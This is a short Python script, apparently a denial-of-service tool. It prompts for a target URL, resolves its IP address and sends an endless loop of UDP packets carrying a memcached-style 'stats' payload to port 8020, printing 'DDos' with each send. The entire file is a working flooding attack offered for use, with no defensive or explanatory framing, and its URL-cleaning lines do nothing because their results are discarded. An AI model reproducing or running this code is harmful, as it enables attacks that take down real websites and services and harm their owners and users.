import socket
import platform
import time
import sys
import os

REE = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[93m'
system = platform.uname()[0]

def cls():
    if system == 'Windows':
      os.system("cls")
    elif system == 'Linux':
        os.system("clear")
cls()
os.system("python src/logo.py")

target = input(f"{GREEN}Enter Target URL: ")
target.replace("http://", "")
target.replace("https://","")
target.replace("www.","")

ip = socket.gethostbyname(target)

port = 8020
joker = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(bytes(joker,"UTF-8"), (ip,port))
print(port,"IP site address >>",ip)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(bytes(joker,"UTF-8"), (ip,port))
print(port,"IP site address >>",ip)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(bytes(joker,"UTF-8"), (ip,port))
print(port,"IP site address >>",ip)

time.sleep(4)

while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(joker,"UTF-8"), (ip,port))
        print(port,"DDos  >>", target, "Ip Address:", ip)
